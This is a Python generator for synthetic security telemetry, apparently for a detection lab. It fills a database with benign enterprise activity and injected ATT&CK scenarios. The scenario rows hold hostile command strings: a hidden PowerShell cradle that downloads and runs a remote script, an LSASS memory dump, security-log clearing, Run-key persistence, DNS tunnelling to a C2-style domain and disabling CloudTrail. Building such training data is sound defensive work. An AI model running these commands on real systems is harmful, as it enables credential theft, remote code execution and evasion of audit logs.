"""
Telemetry Generator for TelemetryLab.
Generates realistic enterprise benign baseline activity across Endpoint, Network,
Identity, and Cloud sources, along with targeted MITRE ATT&CK adversary techniques.
"""
import random
import hashlib
import uuid
from datetime import datetime, timedelta, timezone
from typing import Dict, Any, List, Optional
from pathlib import Path

from core.database import get_connection


# Enterprise Baseline Constants
HOSTS = [
    ("WKSTN-DEV-01", "10.0.1.25"),
    ("WKSTN-DEV-02", "10.0.1.26"),
    ("WKSTN-FIN-04", "10.0.2.14"),
    ("WKSTN-HR-07", "10.0.3.18"),
    ("WKSTN-SEC-12", "10.0.4.99"),
    ("SRV-DC-01", "10.0.0.10"),
    ("SRV-FILE-01", "10.0.0.15"),
    ("SRV-WEB-PROD", "10.0.0.80"),
]

USERS = [
    ("jdoe", "CORP", "Developer"),
    ("asmith", "CORP", "Finance Specialist"),
    ("bwayne", "CORP", "Executive VP"),
    ("cclark", "CORP", "Security Analyst"),
    ("dprince", "CORP", "HR Manager"),
    ("svc_backup", "CORP", "Service Account"),
    ("svc_scanner", "CORP", "Service Account"),
]

BENIGN_PROCESS_TREES = [
    ("explorer.exe", "C:\\Windows\\explorer.exe", "chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility"),
    ("explorer.exe", "C:\\Windows\\explorer.exe", "slack.exe", "C:\\Users\\{user}\\AppData\\Local\\slack\\slack.exe", "\"C:\\Users\\{user}\\AppData\\Local\\slack\\slack.exe\""),
    ("explorer.exe", "C:\\Windows\\explorer.exe", "code.exe", "C:\\Users\\{user}\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe", "\"Code.exe\" ."),
    ("code.exe", "C:\\Users\\{user}\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe", "git.exe", "C:\\Program Files\\Git\\bin\\git.exe", "git status"),
    ("services.exe", "C:\\Windows\\System32\\services.exe", "svchost.exe", "C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s BITS"),
    ("svchost.exe", "C:\\Windows\\System32\\svchost.exe", "RuntimeBroker.exe", "C:\\Windows\\System32\\RuntimeBroker.exe", "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"),
    ("explorer.exe", "C:\\Windows\\explorer.exe", "cmd.exe", "C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\system32\\cmd.exe /c dir"),
    ("explorer.exe", "C:\\Windows\\explorer.exe", "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -ExecutionPolicy Restricted Get-Date"),
]

BENIGN_DOMAINS = [
    "google.com", "github.com", "slack.com", "microsoft.com", "aws.amazon.com",
    "portal.azure.com", "login.okta.com", "stackoverflow.com", "cdn.jsdelivr.net",
    "internal.corp.local", "gitlab.corp.local", "jira.corp.local", "confluence.corp.local"
]

BENIGN_EXTERNAL_IPS = [
    "142.250.190.46", "140.82.121.4", "54.239.28.85", "20.112.52.29",
    "151.101.1.140", "104.16.132.229", "185.199.108.153"
]


def _sha256(text: str) -> str:
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


def _rand_time(start_dt: datetime, end_dt: datetime) -> str:
    delta = end_dt - start_dt
    sec = random.randint(0, int(delta.total_seconds()))
    dt = start_dt + timedelta(seconds=sec)
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")


def generate_telemetry(
    num_benign: int = 600,
    inject_attacks: bool = True,
    days_back: int = 3,
    db_path: Optional[Path] = None
) -> Dict[str, Any]:
    """
    Generates baseline enterprise telemetry and targeted attack scenarios,
    populating all tables in the SQLite database.
    """
    conn = get_connection(db_path)
    cursor = conn.cursor()
    
    now = datetime.now(timezone.utc)
    start_time = now - timedelta(days=days_back)
    
    counts: Dict[str, int] = {
        "endpoint_process": 0,
        "endpoint_file": 0,
        "endpoint_network": 0,
        "endpoint_registry": 0,
        "network_flow": 0,
        "network_dns": 0,
        "network_http": 0,
        "identity_auth": 0,
        "identity_cloud_audit": 0
    }
    
    # --------------------------------------------------------------------------
    # 1. BENIGN ENDPOINT PROCESS TELEMETRY
    # --------------------------------------------------------------------------
    proc_records = []
    pid_pool = [random.randint(1000, 9999) for _ in range(50)]
    
    for _ in range(num_benign):
        host, host_ip = random.choice(HOSTS)
        user, domain, _ = random.choice(USERS)
        parent_name, parent_path, proc_name, proc_path_tpl, cmd_tpl = random.choice(BENIGN_PROCESS_TREES)
        
        proc_path = proc_path_tpl.replace("{user}", user)
        cmd = cmd_tpl.replace("{user}", user)
        ppid = random.choice(pid_pool)
        pid = random.randint(10000, 65535)
        
        ts = _rand_time(start_time, now)
        sha = _sha256(f"{proc_name}_{ts}")
        
        proc_records.append((
            ts, host, user, proc_name, proc_path, pid, ppid,
            parent_name, parent_path, cmd, parent_path, sha, "Medium", 0
        ))
        
    cursor.executemany("""
        INSERT INTO endpoint_process (
            timestamp, host_name, user_name, process_name, process_path,
            process_id, parent_process_id, parent_process_name, parent_process_path,
            command_line, parent_command_line, process_hash_sha256, integrity_level, is_elevated
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?);
    """, proc_records)
    counts["endpoint_process"] += len(proc_records)

    # --------------------------------------------------------------------------
    # 2. BENIGN FILE ACTIVITY
    # --------------------------------------------------------------------------
    file_records = []
    for _ in range(num_benign // 2):
        host, _ = random.choice(HOSTS)
        user, _, _ = random.choice(USERS)
        ts = _rand_time(start_time, now)
        action = random.choice(["CREATE", "MODIFY", "DELETE"])
        filename = random.choice(["report_q3.xlsx", "notes.txt", "cache.dat", "config.json", "index.ts", "package-lock.json"])
        filepath = f"C:\\Users\\{user}\\Documents\\{filename}"
        sha = _sha256(f"{filepath}_{ts}")
        
        file_records.append((
            ts, host, user, "chrome.exe", random.randint(1000, 9999),
            filename, filepath, sha, action
        ))
        
    cursor.executemany("""
        INSERT INTO endpoint_file (
            timestamp, host_name, user_name, process_name, process_id,
            target_filename, target_filepath, file_hash_sha256, action
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?);
    """, file_records)
    counts["endpoint_file"] += len(file_records)

    # --------------------------------------------------------------------------
    # 3. BENIGN ENDPOINT NETWORK
    # --------------------------------------------------------------------------
    ep_net_records = []
    for _ in range(num_benign // 2):
        host, host_ip = random.choice(HOSTS)
        dest_ip = random.choice(BENIGN_EXTERNAL_IPS)
        dest_port = random.choice([443, 80, 8080])
        src_port = random.randint(49152, 65535)
        ts = _rand_time(start_time, now)
        
        ep_net_records.append((
            ts, host, "chrome.exe", random.randint(1000, 9999),
            host_ip, src_port, dest_ip, dest_port, "TCP", "outbound"
        ))
        
    cursor.executemany("""
        INSERT INTO endpoint_network (
            timestamp, host_name, process_name, process_id,
            src_ip, src_port, dest_ip, dest_port, protocol, direction
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?);
    """, ep_net_records)
    counts["endpoint_network"] += len(ep_net_records)

    # --------------------------------------------------------------------------
    # 4. BENIGN REGISTRY TELEMETRY
    # --------------------------------------------------------------------------
    reg_records = []
    for _ in range(num_benign // 3):
        host, _ = random.choice(HOSTS)
        user, _, _ = random.choice(USERS)
        ts = _rand_time(start_time, now)
        target = random.choice([
            "HKCU\\Software\\Google\\Chrome\\PreferenceMACs",
            "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters",
            "HKCU\\Software\\Microsoft\\Office\\16.0\\Common\\General",
            "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zones"
        ])
        reg_records.append((
            ts, host, user, "svchost.exe", target, "NormalConfigurationData", "SetInformation"
        ))
    cursor.executemany("""
        INSERT INTO endpoint_registry (
            timestamp, host_name, user_name, process_name, target_object, details, event_type
        ) VALUES (?, ?, ?, ?, ?, ?, ?);
    """, reg_records)
    counts["endpoint_registry"] += len(reg_records)

    # --------------------------------------------------------------------------
    # 5. BENIGN NETWORK FLOWS & HTTP
    # --------------------------------------------------------------------------
    flow_records = []
    http_records = []
    for _ in range(num_benign):
        _, src_ip = random.choice(HOSTS)
        dest_ip = random.choice(BENIGN_EXTERNAL_IPS)
        dest_port = random.choice([443, 80])
        src_port = random.randint(49152, 65535)
        bytes_sent = random.randint(500, 45000)
        bytes_recv = random.randint(2000, 250000)
        packets = random.randint(5, 120)
        ts = _rand_time(start_time, now)
        
        flow_records.append((
            ts, src_ip, src_port, dest_ip, dest_port, "TCP",
            bytes_sent, bytes_recv, packets, "ALLOW", "ssl" if dest_port == 443 else "http", "SF"
        ))
        
        if dest_port == 80:
            domain = random.choice(BENIGN_DOMAINS)
            http_records.append((
                ts, src_ip, dest_ip, "GET", domain, "/api/v1/ping",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                200, bytes_recv
            ))
            
    cursor.executemany("""
        INSERT INTO network_flow (
            timestamp, src_ip, src_port, dest_ip, dest_port, protocol,
            bytes_sent, bytes_recv, packets, action, app_proto, conn_state
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?);
    """, flow_records)
    counts["network_flow"] += len(flow_records)
    
    if http_records:
        cursor.executemany("""
            INSERT INTO network_http (
                timestamp, src_ip, dest_ip, method, host, uri, user_agent, status_code, bytes
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?);
        """, http_records)
        counts["network_http"] += len(http_records)

    # --------------------------------------------------------------------------
    # 6. BENIGN DNS QUERIES
    # --------------------------------------------------------------------------
    dns_records = []
    for _ in range(num_benign):
        host, host_ip = random.choice(HOSTS)
        domain = random.choice(BENIGN_DOMAINS)
        ts = _rand_time(start_time, now)
        dns_records.append((
            ts, host, host_ip, domain, "A", random.choice(BENIGN_EXTERNAL_IPS), "NOERROR"
        ))
    cursor.executemany("""
        INSERT INTO network_dns (
            timestamp, host_name, src_ip, query, qtype, answers, rcode
        ) VALUES (?, ?, ?, ?, ?, ?, ?);
    """, dns_records)
    counts["network_dns"] += len(dns_records)

    # --------------------------------------------------------------------------
    # 7. BENIGN IDENTITY & CLOUD AUDIT
    # --------------------------------------------------------------------------
    auth_records = []
    for _ in range(num_benign // 2):
        user, domain, _ = random.choice(USERS)
        ts = _rand_time(start_time, now)
        _, host_ip = random.choice(HOSTS)
        auth_records.append((
            ts, user, domain, host_ip, "Interactive", "SUCCESS",
            None, "workstation-corp", 1, "US", "Mozilla/5.0 Edge/120.0"
        ))
    cursor.executemany("""
        INSERT INTO identity_auth (
            timestamp, user_name, user_domain, src_ip, logon_type,
            auth_status, failure_reason, target_service, mfa_used, geo_country, user_agent
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?);
    """, auth_records)
    counts["identity_auth"] += len(auth_records)

    cloud_records = []
    for _ in range(num_benign // 3):
        user, _, _ = random.choice(USERS)
        ts = _rand_time(start_time, now)
        action = random.choice(["DescribeInstances", "GetCallerIdentity", "ListBuckets", "GetSecretValue"])
        cloud_records.append((
            ts, f"arn:aws:iam::123456789012:user/{user}", "IAMUser",
            action, "arn:aws:s3:::corp-internal-assets", "S3Bucket",
            "10.0.1.25", "aws-sdk-go/v1.44.0", "SUCCESS", None
        ))
    cursor.executemany("""
        INSERT INTO identity_cloud_audit (
            timestamp, actor, actor_type, action, resource_name,
            resource_type, src_ip, user_agent, status, error_code
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?);
    """, cloud_records)
    counts["identity_cloud_audit"] += len(cloud_records)

    # --------------------------------------------------------------------------
    # 8. INJECTED MITRE ATT&CK ATTACK SCENARIOS
    # --------------------------------------------------------------------------
    if inject_attacks:
        attack_time = now - timedelta(hours=6)
        
        # --- Scenario 1: T1059.001 - Phishing Office spawning Malicious PowerShell Download Cradle ---
        t1 = attack_time.strftime("%Y-%m-%dT%H:%M:%SZ")
        mal_cmd = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://45.33.32.156/stage1.ps1')\""
        cursor.execute("""
            INSERT INTO endpoint_process (
                timestamp, host_name, user_name, process_name, process_path,
                process_id, parent_process_id, parent_process_name, parent_process_path,
                command_line, parent_command_line, process_hash_sha256, integrity_level, is_elevated
            ) VALUES (?, 'WKSTN-FIN-04', 'asmith', 'powershell.exe', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
                      8844, 4120, 'winword.exe', 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
                      ?, 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n \"Q3_Invoice_Overdue.docx\"',
                      'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', 'Medium', 0);
        """, (t1, mal_cmd))
        counts["endpoint_process"] += 1
        
        # Dropped payload file
        cursor.execute("""
            INSERT INTO endpoint_file (
                timestamp, host_name, user_name, process_name, process_id,
                target_filename, target_filepath, file_hash_sha256, action
            ) VALUES (?, 'WKSTN-FIN-04', 'asmith', 'powershell.exe', 8844,
                      'stage1.ps1', 'C:\\Users\\asmith\\AppData\\Local\\Temp\\stage1.ps1',
                      'a89c938491820194820184028104820184028401824018240182048102481024', 'CREATE');
        """, (t1,))
        counts["endpoint_file"] += 1

        # C2 Callback
        cursor.execute("""
            INSERT INTO endpoint_network (
                timestamp, host_name, process_name, process_id,
                src_ip, src_port, dest_ip, dest_port, protocol, direction
            ) VALUES (?, 'WKSTN-FIN-04', 'powershell.exe', 8844,
                      '10.0.2.14', 51042, '45.33.32.156', 80, 'TCP', 'outbound');
        """, (t1,))
        counts["endpoint_network"] += 1

        # --- Scenario 2: T1003.001 - LSASS Memory Dumping via Procdump / Rundll32 ---
        t2 = (attack_time + timedelta(minutes=15)).strftime("%Y-%m-%dT%H:%M:%SZ")
        cursor.execute("""
            INSERT INTO endpoint_process (
                timestamp, host_name, user_name, process_name, process_path,
                process_id, parent_process_id, parent_process_name, parent_process_path,
                command_line, parent_command_line, process_hash_sha256, integrity_level, is_elevated
            ) VALUES (?, 'WKSTN-DEV-01', 'jdoe', 'procdump64.exe', 'C:\\Tools\\procdump64.exe',
                      9102, 3320, 'cmd.exe', 'C:\\Windows\\System32\\cmd.exe',
                      'procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp', 'cmd.exe',
                      '9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b', 'High', 1);
        """, (t2,))
        counts["endpoint_process"] += 1

        cursor.execute("""
            INSERT INTO endpoint_file (
                timestamp, host_name, user_name, process_name, process_id,
                target_filename, target_filepath, file_hash_sha256, action
            ) VALUES (?, 'WKSTN-DEV-01', 'jdoe', 'procdump64.exe', 9102,
                      'lsass.dmp', 'C:\\Windows\\Temp\\lsass.dmp',
                      'ffeeddccbbaa99887766554433221100ffeeddccbbaa99887766554433221100', 'CREATE');
        """, (t2,))
        counts["endpoint_file"] += 1

        # --- Scenario 3: T1110.003 & T1078 - Password Spray followed by Compromise & Impossible Travel ---
        spray_time = attack_time + timedelta(hours=1)
        spray_attacker_ip = "185.220.101.5" # Tor exit node
        for i, target_user in enumerate(["asmith", "jdoe", "cclark", "dprince", "admin", "guest", "service"]):
            st = (spray_time + timedelta(seconds=i * 12)).strftime("%Y-%m-%dT%H:%M:%SZ")
            cursor.execute("""
                INSERT INTO identity_auth (
                    timestamp, user_name, user_domain, src_ip, logon_type,
                    auth_status, failure_reason, target_service, mfa_used, geo_country, user_agent
                ) VALUES (?, ?, 'CORP', ?, 'Network', 'FAILURE', 'BadPassword', 'o365', 0, 'RU', 'Python-requests/2.28.1');
            """, (st, target_user, spray_attacker_ip))
            counts["identity_auth"] += 1
            
        # Successful login from spray attacker IP for bwayne without MFA
        success_spray_time = (spray_time + timedelta(minutes=2)).strftime("%Y-%m-%dT%H:%M:%SZ")
        cursor.execute("""
            INSERT INTO identity_auth (
                timestamp, user_name, user_domain, src_ip, logon_type,
                auth_status, failure_reason, target_service, mfa_used, geo_country, user_agent
            ) VALUES (?, 'bwayne', 'CORP', ?, 'Network', 'SUCCESS', NULL, 'o365', 0, 'RU', 'Python-requests/2.28.1');
        """, (success_spray_time, spray_attacker_ip))
        counts["identity_auth"] += 1

        # Legitimate login 10 minutes later from US (Impossible Travel)
        legit_travel_time = (spray_time + timedelta(minutes=12)).strftime("%Y-%m-%dT%H:%M:%SZ")
        cursor.execute("""
            INSERT INTO identity_auth (
                timestamp, user_name, user_domain, src_ip, logon_type,
                auth_status, failure_reason, target_service, mfa_used, geo_country, user_agent
            ) VALUES (?, 'bwayne', 'CORP', '73.189.44.12', 'Interactive', 'SUCCESS', NULL, 'o365', 1, 'US', 'Mozilla/5.0 Mac OS X');
        """, (legit_travel_time,))
        counts["identity_auth"] += 1

        # --- Scenario 4: T1547.001 - Persistence via Registry Run Key ---
        t4 = (attack_time + timedelta(hours=2)).strftime("%Y-%m-%dT%H:%M:%SZ")
        cursor.execute("""
            INSERT INTO endpoint_registry (
                timestamp, host_name, user_name, process_name, target_object, details, event_type
            ) VALUES (?, 'WKSTN-FIN-04', 'asmith', 'powershell.exe',
                      'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpdater',
                      'C:\\Users\\asmith\\AppData\\Roaming\\update.exe', 'SetInformation');
        """, (t4,))
        counts["endpoint_registry"] += 1

        # --- Scenario 5: T1071.004 / T1568 - High-Entropy DNS Tunneling / Exfiltration ---
        t5_base = attack_time + timedelta(hours=3)
        for i in range(15):
            t5 = (t5_base + timedelta(seconds=i * 2)).strftime("%Y-%m-%dT%H:%M:%SZ")
            # Generate high entropy subdomain
            rnd_sub = uuid.uuid4().hex + uuid.uuid4().hex[:8]
            dga_query = f"{rnd_sub}.ns1.darkmatter-c2.net"
            cursor.execute("""
                INSERT INTO network_dns (
                    timestamp, host_name, src_ip, query, qtype, answers, rcode
                ) VALUES (?, 'WKSTN-DEV-01', '10.0.1.25', ?, 'TXT', '198.51.100.99', 'NOERROR');
            """, (t5, dga_query))
            counts["network_dns"] += 1

        # --- Scenario 6: T1048 - Exfiltration over Alternative Port / Huge Outbound Spike ---
        t6 = (attack_time + timedelta(hours=4)).strftime("%Y-%m-%dT%H:%M:%SZ")
        cursor.execute("""
            INSERT INTO network_flow (
                timestamp, src_ip, src_port, dest_ip, dest_port, protocol,
                bytes_sent, bytes_recv, packets, action, app_proto, conn_state
            ) VALUES (?, '10.0.1.25', 49812, '198.51.100.44', 443, 'TCP',
                      4850000000, 15000, 3200000, 'ALLOW', 'ssl', 'SF');
        """, (t6,))
        counts["network_flow"] += 1

        # --- Scenario 7: T1070.001 - Indicator Removal / Clearing Windows Event Log ---
        t7 = (attack_time + timedelta(hours=4, minutes=30)).strftime("%Y-%m-%dT%H:%M:%SZ")
        cursor.execute("""
            INSERT INTO endpoint_process (
                timestamp, host_name, user_name, process_name, process_path,
                process_id, parent_process_id, parent_process_name, parent_process_path,
                command_line, parent_command_line, process_hash_sha256, integrity_level, is_elevated
            ) VALUES (?, 'WKSTN-DEV-01', 'SYSTEM', 'wevtutil.exe', 'C:\\Windows\\System32\\wevtutil.exe',
                      7712, 1044, 'cmd.exe', 'C:\\Windows\\System32\\cmd.exe',
                      'wevtutil.exe cl Security', 'cmd.exe /c wevtutil.exe cl Security',
                      '11223344556677889900aabbccddeeff11223344556677889900aabbccddeeff', 'System', 1);
        """, (t7,))
        counts["endpoint_process"] += 1

        # --- Scenario 8: CloudTrail Defense Evasion (StopLogging) ---
        t8 = (attack_time + timedelta(hours=5)).strftime("%Y-%m-%dT%H:%M:%SZ")
        cursor.execute("""
            INSERT INTO identity_cloud_audit (
                timestamp, actor, actor_type, action, resource_name,
                resource_type, src_ip, user_agent, status, error_code
            ) VALUES (?, 'arn:aws:iam::123456789012:user/admin-compromised', 'IAMUser',
                      'StopLogging', 'arn:aws:cloudtrail:us-east-1:123456789012:trail/corp-security-trail',
                      'CloudTrail', '185.220.101.5', 'aws-cli/2.9.1', 'SUCCESS', NULL);
        """, (t8,))
        counts["identity_cloud_audit"] += 1
        
    conn.commit()
    conn.close()
    
    return {
        "status": "success",
        "generated_counts": counts,
        "total_events": sum(counts.values()),
        "attacks_injected": inject_attacks
    }
